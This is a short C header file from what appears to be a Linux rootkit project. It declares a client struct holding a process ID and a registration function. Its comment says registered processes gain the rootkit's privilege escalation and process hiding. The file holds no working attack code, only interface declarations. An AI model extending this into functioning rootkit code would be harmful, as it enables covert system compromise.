#ifndef _ROOTI_CLIENT_H
#define _ROOTI_CLIENT_H

#include "linux/types.h"

/*
    Represents a userspace process which was registered by the rootkit in order to get access
    to its features such as privilege escalation, hiding of the process etc.
*/
struct rooti_client {
    pid_t pid;            // PID of the client
};

int rooti_register_client(struct rooti_client *client);

#endif